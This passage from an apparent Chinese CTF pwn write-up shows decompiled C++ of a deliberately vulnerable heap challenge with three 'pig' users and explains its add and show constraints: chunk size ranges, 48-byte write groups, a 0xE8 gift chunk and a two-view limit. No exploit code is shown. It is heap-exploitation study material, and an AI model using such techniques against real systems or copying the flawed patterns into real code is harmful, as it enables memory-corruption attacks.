class="line">              std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              info = &amp;info2;</span><br><span class="line">              <span class="built_in">get_info2</span>(&amp;info2);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">              v6 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;This is Daddy Pig~&quot;</span>);</span><br><span class="line">              std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              info = &amp;info3;</span><br><span class="line">              <span class="built_in">get_info3</span>(&amp;info3);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid...&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>一道 <code>c++</code> 的 <code>pwn</code> 题。三只猪用户，一共五种操作，添加，查看，修改，删除，登录。最开始默认<code>peppa</code>（猪A）先操作，猪A的 <code>id=1</code> ，<code>Mummy</code> （猪B）的 <code>id=2</code>，<code>Daddy</code> （猪C）的 <code>id=3</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add</span><span class="params">(Info *info, <span class="type">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( id )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">add_1</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">add_2</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">add_3</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; info-&gt;ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;min_size1 &lt;= <span class="number">0x8F</span> )</span><br><span class="line">      state-&gt;min_size1 = <span class="number">0x90</span>;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    size = <span class="built_in">get_num</span>();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt;= state-&gt;min_size1 &amp;&amp; size &lt;= <span class="number">0x430</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      state-&gt;min_size1 = size;</span><br><span class="line">      info-&gt;ptr[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( !info-&gt;ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      info-&gt;size[i] = size;</span><br><span class="line">      info-&gt;flag1[i] = <span class="number">0</span>;</span><br><span class="line">      info-&gt;flag2[i] = <span class="number">0</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Peppa&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; size / <span class="number">0x30</span>; ++j )</span><br><span class="line">        <span class="built_in">read_n</span>(&amp;info-&gt;ptr[i][<span class="number">0x30</span> * j], <span class="number">0x10</span>LL);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add_2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; info-&gt;ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;min_size2 &lt;= <span class="number">0x8F</span> )</span><br><span class="line">      state-&gt;min_size2 = <span class="number">0x90</span>;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    size = <span class="built_in">get_num</span>();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt;= state-&gt;min_size2 &amp;&amp; size &lt;= <span class="number">0x450</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      state-&gt;min_size2 = size;</span><br><span class="line">      info-&gt;ptr[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( !info-&gt;ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      info-&gt;size[i] = size;</span><br><span class="line">      info-&gt;flag1[i] = <span class="number">0</span>;</span><br><span class="line">      info-&gt;flag2[i] = <span class="number">0</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Mummy&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; size / <span class="number">0x30</span>; ++j )</span><br><span class="line">        <span class="built_in">read_n</span>(&amp;info-&gt;ptr[i][<span class="number">0x30</span> * j + <span class="number">0x10</span>], <span class="number">0x10</span>LL);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span> &amp;&amp; info-&gt;ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;min_size3 &lt;= <span class="number">0x8F</span> )</span><br><span class="line">      state-&gt;min_size3 = <span class="number">0x90</span>;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    size = <span class="built_in">get_num</span>();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x8F</span> &amp;&amp; size &lt;= <span class="number">0x440</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      state-&gt;min_size3 = size;</span><br><span class="line">      info-&gt;ptr[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( !info-&gt;ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      info-&gt;size[i] = size;</span><br><span class="line">      info-&gt;flag1[i] = <span class="number">0</span>;</span><br><span class="line">      info-&gt;flag2[i] = <span class="number">0</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Daddy&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; size / <span class="number">0x30</span>; ++j )</span><br><span class="line">        <span class="built_in">read_n</span>(&amp;info-&gt;ptr[i][<span class="number">0x30</span> * j + <span class="number">0x20</span>], <span class="number">0x10</span>LL);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">if</span> ( i == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0xE8</span>uLL);</span><br><span class="line">        v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;01dwang&#x27;s Gift:&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">read_n</span>(v11, <span class="number">0xE8</span>LL);</span><br><span class="line">        v6 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>添加操作一共有三种，分别对应猪A，猪B，猪C。猪A可以遍历 <code>0~19</code> 的索引，并添加一个大小在 <code>0x90~0x430</code> 的 <code>chunk</code>，猪B 只能遍历 <code>0~9</code> 的索引，并添加大小在 <code>0x90~0x450</code> 的 <code>chunk</code>。对于猪C，则是 <code>0~4</code> 的索引和 <code>0x90~0x440</code> 的 <code>chunk</code>。猪A, 猪B分配的<code>chunk</code>大小只能一次比一次大或者本次与上一次相等，但猪C没有这个限制。另外，在猪C函数中如果添加 <code>chunk</code> 的索引为 <code>4</code>，则还可以再分配一个大小为<code>0xE8</code>的<code>chunk</code>并写入最大长度为<code>0xE8</code>的内容。 3只猪在<code>add</code>之后可以立即向新分配的<code>chunk</code>中写入内容，但不是<code>chunk</code>中任何位置都能写，<code>chunk</code>空间以<code>48</code>字节为大小分组。对于猪A，每一组48字节空间只能写前面16字节，对于猪B则是只能写中间16字节，对于猪C只能写后面<code>16</code>字节。在写入后，会设置两个标志位为0。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show</span><span class="params">(Info *info, <span class="type">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( state-&gt;show_times &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;No view for you...&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">show_1</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">show_2</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">show_3</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    --state-&gt;show_times;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show_1</span><span class="params">(Info *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;ptr[index] &amp;&amp; a1-&gt;size[index] &amp;&amp; !a1-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, a1-&gt;ptr[index]);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show_2</span><span class="params">(Info *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;ptr[index] &amp;&amp; a1-&gt;size[index] &amp;&amp; !a1-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, a1-&gt;ptr[index]);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show_3</span><span class="params">(Info *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;ptr[index] &amp;&amp; a1-&gt;size[index] &amp;&amp; !a1-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, a1-&gt;ptr[index]);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3只猪可以查看的索引范围和可以<code>add</code>的索引范围相同。而且查看时需要有一个标志位为0。这个标志位是<code>add</code>中设置的两个标志位中的第一个。本题限制<code>view</code>的次数最多为2次。</p>
